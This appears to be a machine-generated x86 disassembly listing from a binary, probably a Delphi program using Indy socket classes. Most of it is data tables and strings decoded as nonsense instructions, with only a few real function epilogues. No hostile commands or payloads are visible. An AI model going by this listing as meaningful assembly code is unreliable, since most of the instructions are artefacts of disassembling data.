inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0xc0046 ] ah
jae r-xdata
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ecx + 0xc0046 ]
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xb170c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] dh
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ ecx ] dl
inc ebp
dec ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
dec ecx
outsb
je r-xdata
nop
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xb0
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
or eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov al 0x46
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + eax * 2 + 0xc00 ] dh
add [ eax + esi * 4 + 0x46 ] ah
push 0x6f727245
jb r-xdata
inc eax
add [ ecx + esi + 0x40 ] al
add [ edi ] dl
jae r-xdata
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax * 2 + 0x6f536449 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] al
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x46b24090
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 ] cl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop ss
outsd
jb r-xdata
inc eax
mov dl 0x46
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
push ebx
jb r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
shl al 0xaf
inc esi
add [ eax ] al
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
rcl al 0xb3
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov dl 0x46
add [ eax + eax ] cl
inc eax
add [ edx + esi * 4 + 0x46 ] ah
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x45
dec ecx
push ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov dl 0x46
jb r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ 0x53644945 ] dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx ] dl
inc ebp
dec ecx
ror [ ecx + esi * 4 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
scasd [ edi ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
mov [ edi + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edi + 0x100046 ] gs
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
test al 0xb7
inc esi
add [ 0x50644945 ] dl
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
jb r-xdata
outsd
jb r-xdata
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ ecx ] ah
inc ebp
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0xc0046 ] 0x1
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
outsd
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
popad
imul ebp [ ebp + 0x64 ] r-xdata
adc al 0xb5
inc esi
add [ eax ] al
add [ eax ] al
test [ ebp + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp + 0xc0046 ] dh
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 4 + 0xc0046 ] dl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
rcl [ esi * 4 + 0x46 ] 0x0
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
jb r-xdata
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov bl 0x46
add [ eax + eax ] cl
mov bl 0x46
inc ebp
jb r-xdata
or al 0xb3
inc esi
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and al [ ebp + 0x49 ]
je r-xdata
jb r-xdata
popad
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ esp + esi * 4 + 0x46 ] 0x0
jb r-xdata
insb
inc ebp
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax 0x53644945
outsd
outsb
outsb
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ 0x53644945 ] bl
jb r-xdata
outsd
jb r-xdata
outsd
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] ah
inc ebp
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0xc0046 ] ah
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
and [ ebp + 0x49 ] eax
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
shl [ esi + esi * 4 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
mov dh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x46 ] ah
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
int3
jb r-xdata
jb r-xdata
nop
inc eax
add al bh
mov ch 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov ch 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
cmp [ esi + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov ah 0x46
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ebp + 0x49 ] al
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
push esp
dec esp
inc ebp
js r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
jb r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
lea eax [ eax ]
xchg esp eax
mov bh 0x46
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x100046b7 ] bl
add [ eax ] al
add [ esp + ebp * 4 + 0x33840046 ] dl
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
outsd
jb r-xdata
outsb
inc ebp
xor al 0xb7
inc esi
add [ eax ] al
add [ eax ] al
sub_46b0a1
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ 0x53644945 ] dl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
ror [ ecx + esi * 4 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov cl 0x46
add [ eax + eax ] cl
jae r-xdata
nop
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] cl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax 0x53644945
outsd
outsb
mov al 0xb0
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b0 ] dh
add [ eax ] al
add [ esp + ebp * 4 + 0x33840046 ] dl
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0xc0046 ] ah
jae r-xdata
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ecx + 0xc0046 ]
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xb170c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 4 ] cl
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop ss
outsd
jb r-xdata
inc eax
mov dl 0x46
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov dl 0x46
add [ eax + eax ] cl
inc eax
add [ edx + esi * 4 + 0x46 ] ah
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc al 0x45
dec ecx
push ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov dl 0x46
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi + eax * 2 + 0xc00 ] dh
add [ eax + esi * 4 + 0x46 ] ah
push 0x6f727245
jb r-xdata
inc ebp
inc eax
add [ ecx + esi + 0x40 ] al
add [ edi ] dl
jae r-xdata
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax * 2 + 0x6f536449 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] al
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x46b24090
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0xc0046 ] 0x1
outsd
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ edx ] bl
inc ebp
dec ecx
popad
imul ebp [ ebp + 0x64 ] r-xdata
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
rcl al 0xb3
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
inc ebp
jb r-xdata
outsd
jb r-xdata
jb r-xdata
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov bl 0x46
add [ eax + eax ] cl
mov bl 0x46
jb r-xdata
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ ecx ] ah
inc ebp
dec ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x46
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
outsd
jb r-xdata
jb r-xdata
rcl [ esi * 4 + 0x46 ] 0x0
jb r-xdata
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ esp + esi * 4 + 0x46 ] 0x0
jb r-xdata
insb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 4 + 0xc0046 ] dl
